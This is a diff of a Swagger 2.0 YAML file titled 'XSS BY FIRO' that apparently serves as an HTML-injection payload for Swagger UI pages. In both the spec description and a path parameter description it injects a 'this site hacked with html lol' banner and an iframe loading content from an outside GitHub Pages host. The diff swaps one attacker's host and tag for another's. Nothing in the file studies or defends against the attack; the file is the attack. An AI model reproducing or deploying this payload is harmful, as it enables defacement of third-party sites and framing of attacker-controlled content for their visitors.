@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS BY FIRO
   description: |
-    <center><h1>this site hacked with html lol </h1></center><iframe src="https://mchklt.github.io/hacked.html" width="100%" height="300" style="border:1px solid black;"> </iframe>
+    <center><h1>this site hacked with html lol </h1></center><iframe src="https://firo17.github.io/firo.github.io/test.yaml" width="100%" height="300" style="border:1px solid black;"> </iframe>
   version: production
 basePath: /JSSResource/
 produces:
@@ -20,14 +20,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - MCHKLT_XSS
+        - FIRO_XSS
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <center><h1>this site hacked with html lol </h1></center><iframe src="https://mchklt.github.io/hacked.html" width="100%" height="300" style="border:1px solid black;"> </iframe>
+            <center><h1>this site hacked with html lol </h1></center><iframe src="https://firo17.github.io/firo.github.io/test.yaml" width="100%" height="300" style="border:1px solid black;"> </iframe>
           format: int64
           in: path
           name: id
